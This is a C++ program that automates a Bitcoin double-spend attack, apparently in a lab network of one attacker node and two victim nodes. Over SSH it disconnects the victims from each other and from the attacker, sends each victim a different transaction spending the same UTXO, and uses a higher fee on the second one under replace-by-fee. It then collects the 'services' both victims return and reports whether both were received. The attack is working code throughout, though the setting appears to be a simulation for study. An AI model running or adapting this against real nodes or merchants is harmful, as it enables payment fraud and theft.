#include <cstdlib>
#include <cstdio>

#include "CParameterPreparator.h"
#include "CSynchronizationGuard.h"
#include "CTransactionHandler.h"

int main() {
    //Perform a synchronization check.
    if (system("~/attacks/scripts/checkSynchronization.sh")) {
        std::cerr << rang::fg::red << rang::style::bold << "------------------NETWORK ERROR------------------"
                  << std::endl
                  << "One or more of the expected nodes is not running/synchronized. Please try waiting for a short while and rerunning the program. If the problem persists, consider reseting the network. "
                  << rang::style::reset << std::endl;
        return 1;
    }

    //Check whether a usable address exists within the wallet. If not, generate one.
    if (std::filesystem::is_empty("/home/attacker/attacker/addresses")) {
        std::cout << rang::fg::gray << rang::style::bold << "No usable addresses exist, generating new address."
                  << rang::style::reset << std::endl;
        system("bitcoin-cli getnewaddress > ~/attacker/addresses/address_0.txt");
    }

    //Create CSynchronizationGuard object.
    CSynchronizationGuard synchronizationGuard;
    CParameterPreparator parameterPreparator;
    CTransactionHandler transactionHandler;

    //Call function to choose further used UTXO or generate it in case no usable UTXOs exist. 
    transactionInfo UTXO = parameterPreparator.chooseUTXO();

    //Get the transaction details.
    std::pair<std::string, std::string> victimAddresses = parameterPreparator.generateAddresses(
            "ssh victim1@$IP_VICTIM1 \'bitcoin-cli getnewaddress | tee victim1/addresses/address_$(($(ls -l victim1/addresses | wc -l) - 1)).txt\'",
            "ssh victim2@$IP_VICTIM2 \'bitcoin-cli getnewaddress | tee victim2/addresses/address_$(($(ls -l victim2/addresses | wc -l) - 1)).txt\'");
    std::pair<float, float> paidAmmounts = parameterPreparator.calculateAmmounts(UTXO, 0.11);

    //Create transactions using the same UTXOs, but to different addresses. 
    std::ostringstream tx1Oss, tx2Oss;
    tx1Oss << "bitcoin-cli createrawtransaction \'[{\"txid\": \"" << UTXO.m_txID << "\",\"vout\":" << UTXO.m_vout
           << "}]\' \'{\"" << victimAddresses.first << "\":" << paidAmmounts.first << ", \"" << UTXO.m_address << "\":"
           << paidAmmounts.second;
    //Fee on the second transaction has to be higher due to RBF policy: https://buybitcoinworldwide.com/rbf/
    tx2Oss << "bitcoin-cli createrawtransaction \'[{\"txid\": \"" << UTXO.m_txID << "\",\"vout\":" << UTXO.m_vout
           << "}]\' \'{\"" << victimAddresses.second << "\":" << paidAmmounts.first << ", \"" << UTXO.m_address << "\":"
           << paidAmmounts.second - 0.01;

    //Create transactions using the same UTXOs, but to different addresses. 
    std::pair<std::string, std::string> signedTransactionHexes = transactionHandler.createSignedTransactions(tx1Oss,
                                                                                                             tx2Oss);

    //Disconnect VICTIM2.
    system("ssh victim1@$IP_VICTIM1 \"bitcoin-cli addnode $IP_VICTIM2:18445 remove | bitcoin-cli disconnectnode $IP_VICTIM2:18445\"");
    system("ssh victim2@$IP_VICTIM2 \"bitcoin-cli addnode $IP_VICTIM1:18445 remove | bitcoin-cli disconnectnode $IP_VICTIM1:18445\"");
    system("bitcoin-cli addnode $IP_VICTIM2:18445 remove; bitcoin-cli disconnectnode $IP_VICTIM2:18445");
    system("ssh victim2@$IP_VICTIM2 \"bitcoin-cli addnode $IP_ATTACKER:18445 remove | bitcoin-cli disconnectnode $IP_ATTACKER:18445\"");
    synchronizationGuard.waitForDisconnection(1, 1, 0);

    //Send transaction prepared for VICTIM1.
    std::string sentTxid1 = transactionHandler.sendTransaction(signedTransactionHexes.first);
    synchronizationGuard.waitForTxDelivery("ssh victim1@$IP_VICTIM1 \"bitcoin-cli listtransactions\"", sentTxid1);
    std::cout << rang::fg::gray << rang::style::bold << "The first transaction with txid [" << sentTxid1
              << "] has been sent." << rang::style::reset << std::endl;

    //Disconnect VICTIM1.
    system("bitcoin-cli addnode $IP_VICTIM1:18445 remove; bitcoin-cli disconnectnode $IP_VICTIM1:18445");
    system("ssh victim1@$IP_VICTIM1 \"bitcoin-cli addnode $IP_ATTACKER:18445 remove | bitcoin-cli disconnectnode $IP_ATTACKER:18445\"");
    synchronizationGuard.waitForDisconnection(0, 0, 0);

    //Delete sent transaction from the pool. 
    transactionHandler.deleteTransaction(sentTxid1);

    //Connect back to VICTIM2.
    system("bitcoin-cli addnode $IP_VICTIM2:18445 add");
    system("ssh victim2@$IP_VICTIM2 \"bitcoin-cli addnode $IP_ATTACKER:18445 add\"");
    synchronizationGuard.waitForConnection("bitcoin-cli getaddednodeinfo",
                                           "ssh victim2@$IP_VICTIM2 'bitcoin-cli getaddednodeinfo'");

    //Send the second transaction and gain its txid.
    std::string sentTxid2 = transactionHandler.sendTransaction(signedTransactionHexes.second);
    synchronizationGuard.waitForTxDelivery("ssh victim2@$IP_VICTIM2 \"bitcoin-cli listtransactions\"", sentTxid2);
    std::cout << rang::fg::gray << rang::style::bold << "The second transaction with txid [" << sentTxid2
              << "] has been sent." << rang::style::reset << std::endl;

    //Delete any previously received services. Ipstreams' only purpose is to silence output.
    redi::ipstream del(
            "rm -r /home/attacker/attacker/victim1/serviceVictim1.txt /home/attacker/attacker/victim2/serviceVictim2.txt",
            redi::pstreams::pstdout | redi::pstreams::pstderr);

    //Issue calls to both victims to run their returnService.sh script simmulating a deamon running on them that sends some kind of service for received payments. 
    system("ssh victim1@$IP_VICTIM1 \"./scripts/returnService.sh\"");
    system("ssh victim2@$IP_VICTIM2 \"./scripts/returnService.sh\"");

    //Print both transactions to display that they exist in the attackers mempools.
    std::cout << rang::fg::gray << rang::style::bold
              << "Both nodes have transactions spending the same output in their mempools:" << rang::style::reset
              << std::endl;
    transactionHandler.printTransactions("-----------------------VICTIM1-----------------------",
                                         "-----------------------VICTIM2-----------------------",
                                         "ssh victim1@$IP_VICTIM1 \"bitcoin-cli listtransactions \'*\' 200\"",
                                         "ssh victim2@$IP_VICTIM2 \"bitcoin-cli listtransactions \'*\' 200\"",
                                         sentTxid1, sentTxid2);

    //Mine a block on random of the connected nodes to simulate randomness of the network.
    srand((unsigned) time(0));
    if (std::rand() % 2 == 1) {
        std::cout << rang::fg::gray << rang::style::bold
                  << "VICTIM1 has been randomly chosen to be the one mining a block. => Transaction [" << sentTxid1
                  << "] should persist." << rang::style::reset << std::endl;
        system("ssh victim1@$IP_VICTIM1 \"bitcoin-cli -generate 1 &> /dev/null\"");
    } else {
        std::cout << rang::fg::gray << rang::style::bold
                  << "VICTIM2 has been randomly chosen to be the one mining a block. => Transaction [" << sentTxid2
                  << "] should persist." << rang::style::reset << std::endl;
        system("ssh victim2@$IP_VICTIM2 \"bitcoin-cli -generate 1 &> /dev/null\"");
    }

    //Reconnect back to the VICTIM1.
    system("ssh victim1@$IP_VICTIM1 \"bitcoin-cli addnode $IP_VICTIM2:18445 add &> /dev/null\"");
    system("ssh victim1@$IP_VICTIM1 \"bitcoin-cli addnode $IP_ATTACKER:18445 add &> /dev/null\"");
    system("ssh victim2@$IP_VICTIM2 \"bitcoin-cli addnode $IP_VICTIM1:18445 add &> /dev/null\"");
    system("$(bitcoin-cli addnode $IP_VICTIM1:18445 add) &> /dev/null");

    //Wait for all nodes to connect back.
    while (system("~/attacks/scripts/checkSynchronization.sh")) {
        sleep(DELAY_SEC);
    }

    //Display the fact that only one of the transactions exists after mining a block.
    std::cout << rang::fg::gray << rang::style::bold
              << "Only one of the nodes has the aforementioned transactions in their mempool:" << rang::style::reset
              << std::endl;
    transactionHandler.printTransactions("-----------------------VICTIM1-----------------------",
                                         "-----------------------VICTIM2-----------------------",
                                         "ssh victim1@$IP_VICTIM1 \"bitcoin-cli listtransactions \'*\' 200\"",
                                         "ssh victim2@$IP_VICTIM2 \"bitcoin-cli listtransactions \'*\' 200\"",
                                         sentTxid1, sentTxid2);

    //Check that the attack was successfull -> Sevices that should have been received have been received.
    if (std::filesystem::exists("/home/attacker/attacker/victim1/serviceVictim1.txt") &&
        std::filesystem::exists("/home/attacker/attacker/victim2/serviceVictim2.txt")) {
        std::cout << rang::fg::green << rang::style::bold
                  << "Attack was successful, both services were correctly received:" << rang::style::reset << std::endl;
        std::cout << rang::style::bold << rang::fg::blue << "-----------------------VICTIM1-----------------------"
                  << rang::style::reset << std::endl;
        system("cat ~/attacker/victim1/serviceVictim1.txt");
        std::cout << rang::style::bold << rang::fg::magenta << "-----------------------VICTIM2-----------------------"
                  << rang::style::reset << std::endl;
        system("cat ~/attacker/victim2/serviceVictim2.txt");
        std::cout << rang::style::bold << rang::fg::gray << "-----------------------------------------------------"
                  << rang::style::reset << std::endl;
        std::cout << rang::fg::green << rang::style::bold
                  << "The received services are the files: '~/attacker/victim1/serviceVictim1.txt' and '~/attacker/victim2/serviceVictim2.txt'"
                  << rang::style::reset << std::endl;
    } else {
        std::cout << rang::fg::red << rang::style::bold
                  << "Attack unssuccessful, at least one of the services was not received!" << std::endl
                  << "You can check '~/attacker/victim1/serviceVictim1.txt' and '~/attacker/victim2/serviceVictim2.txt' to debug what happend."
                  << std::endl << "If this was not the expected output, consider reseting the network."
                  << rang::style::reset << std::endl;
    }


    return 0;
}
